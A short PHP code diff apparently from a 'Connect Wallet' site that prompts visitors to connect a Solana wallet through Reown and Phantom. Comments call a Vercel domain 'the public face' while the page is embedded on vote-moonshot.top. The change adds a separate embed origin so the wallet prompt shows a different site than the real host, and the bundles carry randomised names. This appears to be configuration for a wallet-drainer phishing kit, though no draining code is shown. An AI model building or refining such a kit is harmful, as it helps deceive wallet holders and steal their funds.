@@ -16,8 +16,10 @@ $cfg = [
     'site_name' => 'Connect Wallet',
     'site_description' => 'Connect your Solana wallet',
     'site_icons' => ['https://fuzzy-octo-guacamole-delta.vercel.app/tYZq2BsVawvS5wYEF.svg'],
-    // Shown in wallet connect UI / popup (Reown metadata). Page can be vote-moonshot.top; this is the public face.
+    // Reown metadata on Vercel /connect/ (Phantom provider prompt).
     'site_url' => 'https://fuzzy-octo-guacamole-delta.vercel.app',
+    // Reown wallet picker on the embed host (vote-moonshot).
+    'embed_site_url' => 'https://vote-moonshot.top',
 
     'vercel_bundle_url' => 'https://fuzzy-octo-guacamole-delta.vercel.app/0EBM88LeOsHh.js',
 
@@ -169,7 +171,10 @@ function build_embed_config(array $cfg, string $siteUrl): array
     $chunks = chunk_names($cfg);
     $gatewayUrl = chunk_query_url($cfg, $chunks['gateway']);
     $vercelOrigin = public_site_origin($cfg);
-    $embedOrigin = rtrim(request_origin(), '/');
+    $embedOrigin = rtrim((string) ($cfg['embed_site_url'] ?? ''), '/');
+    if ($embedOrigin === '') {
+        $embedOrigin = rtrim(request_origin(), '/');
+    }
     $popupUrl = trim((string) ($cfg['connect_popup_url'] ?? ''));
     if ($popupUrl === '') {
         $popupUrl = rtrim(vercel_api_origin($cfg), '/') . '/profile/';
